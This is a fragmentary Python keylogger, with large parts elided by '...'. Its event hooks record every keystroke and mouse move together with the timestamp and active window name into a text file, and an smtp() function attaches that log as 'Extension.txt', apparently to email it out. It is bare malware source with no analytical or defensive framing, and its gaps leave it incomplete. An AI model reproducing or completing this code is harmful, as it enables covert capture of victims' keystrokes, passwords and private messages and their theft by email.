...
def smtp():
	...
	with open(txt,'rb') as f:
		...
		mime.add_header('Content-Disposition', 'attachment', filename='Extension.txt')
...
def onKeyboardEvent(event):
	global txt
	file=open(txt,'a')
	result="Time: "+str(asctime())+"  "+"Name: "+str(event.WindowName)+"  "+"Key: "+str(event.Key)+"\n"
...
def onMouseEvent(event):
	...
	if event.MessageName=="mouse move":
		...
		file=open(txt,'a')
		result="Time: "+str(asctime())+"  "+"Name: "+str(event.WindowName)+"  "+"Event: "+str(event.MessageName)+"\n"
		file.writelines(result)
		return True
